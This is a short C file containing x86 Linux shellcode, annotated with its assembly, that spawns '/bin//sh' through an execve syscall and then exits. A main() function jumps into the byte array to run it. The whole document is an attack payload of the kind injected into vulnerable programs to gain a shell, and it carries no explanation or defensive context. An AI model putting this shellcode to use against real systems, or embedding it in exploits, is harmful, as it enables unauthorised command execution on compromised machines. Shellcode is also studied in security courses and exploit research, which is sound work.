const char sc[] = 
"\x31\xc0"		// xor    %eax,%eax
"\x50"			// push   %eax
"\x68\x2f\x2f\x73\x68"	// push   $0x68732f2f
"\x68\x2f\x62\x69\x6e"	// push   $0x6e69622f
"\xb0\x0b"		// mov    $0xb,%al
"\x89\xe3"		// mov    %esp,%ebx
"\x31\xc9"		// xor    %ecx,%ecx
"\x31\xd2"		// xor    %edx,%edx
"\xcd\x80"		// int    $0x80
"\x31\xc0"		// xor    %eax,%eax
"\x31\xdb"		// xor    %ebx,%ebx
"\x40"			// inc    %eax
"\xcd\x80"		// int    $0x80
;
int
main () 
{
  __asm__ ("jmp sc");
  return 0;
}
